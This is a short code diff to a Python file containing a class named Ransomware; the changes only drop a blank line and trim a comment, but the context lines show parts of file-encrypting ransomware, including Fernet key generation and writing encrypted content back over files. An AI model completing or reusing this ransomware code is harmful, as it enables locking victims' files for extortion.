@@ -132,7 +132,6 @@ class Ransomware:
 				with open(file, 'wb') as output_file:
 					# --> If action is equal encrypt
 					if self.action == 'encrypt':
-
 						# ENCRYPT IT!!!!
 						encrypted = self.encrypt_it(file, file_content)
 						# --> write encrypted data back into file
@@ -288,7 +287,7 @@ def initiate():
 		# --> Generating and storing Fernet key for encryption/decryption
 		Enigma.key_gen()
 
-	# --> Instantiate our fernet object according to a specific
+	# --> Instantiate our fernet object
 	Enigma.instantiate_fernet()
 	# --> Encrypt or decrypt files based on the crytographic action
 	# --> that was passed as an argument
